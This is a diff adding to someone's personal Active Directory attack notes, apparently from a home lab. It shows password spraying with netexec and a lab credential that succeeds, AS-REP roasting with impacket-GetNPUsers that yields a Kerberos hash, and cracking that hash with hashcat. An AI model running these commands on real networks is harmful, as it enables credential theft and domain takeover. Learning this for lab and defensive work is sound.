@@ -6,6 +6,7 @@ net group "Domain Admins" clare /add /domain   #add a user to dmmain admin group
 gpupdate /force      #update the gp group policy. \n
 net share sharename=c:\foldername          # share a folder
 setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin
+>net accounts    /login policy
 
 ### emulate info of domain
 powershell.exe -nop -exec bypass  #fireup the powershell
@@ -60,8 +61,40 @@ Get-NetGroup \n
           then mark a cimputeror user as owned. click shortest path from owned priciplals
           right click the connection to view the suggestions.
 
-          
-        
+  ### passwd spray
+    /netexec   #pwned means right.
+
+    $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendan1024' -d inmy.com --continue-on-success 
+      SMB         10.0.2.14       445    WIN10-3ALICE     [*] Windows 10 Pro 10240 x64 (name:WIN10-3ALICE) (domain:inmy.com) (signing:False) (SMBv1:True)
+      SMB         10.0.2.14       445    WIN10-3ALICE     [+] inmy.com\alice:Bendan1024 (Pwn3d!)
+
+    /kerbrute.exe
+
+  ### without pre-auth from kerburos. anyone can request a SK1 without auth.
+  #### sk1 is encrypted by requestors passwd hash. so, from sk1 we can decrypt the passwd from hash. But we need a passwd of a account like Alice 
+    /let's say, bob has this privi
+    $ impacket-GetNPUsers -dc-ip 10.0.2.3 -request -outputfile hash inmy.com/alice
+      Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+      Password:
+      Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
+      ----  --------  --------------------------  --------------------------  --------
+      bob             2024-12-02 23:59:40.852364  2024-12-05 00:50:13.750371  0x400200 
+      
+      $krb5asrep$23$bob@INMY.COM:78235c4750327c8df4b5bf6996228911$ec2d6341b2d2085f26eed262f7eb954  
+    Then use hashcat to bruteforce the hash, the last one the used in kerberos AS-REQ
+      $ hashcat --help | grep -i kerberos
+        19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
+        19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+        28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
+        19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
+        19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
+        28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
+         7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
+        13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+        18200 | Kerberos 5, etype 23, AS-REP
+
+      $ hashcat -m 18200 hash passwd.txt #passwd list is requrired.
+          hashcat (v6.2.6) starting
 
       
 
